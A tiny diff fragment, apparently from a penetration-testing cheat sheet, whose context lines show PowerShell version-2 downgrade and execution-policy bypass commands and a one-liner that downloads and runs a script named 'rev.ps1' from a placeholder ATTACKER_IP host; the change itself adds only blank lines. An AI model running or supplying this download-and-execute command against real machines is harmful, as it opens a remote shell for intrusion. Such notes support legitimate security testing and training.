@@ -16,3 +16,5 @@ powershell.exe -version 2
 powershell.exe -version 2 -ExecutionPolicy bypass
 powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
 ```
+
+
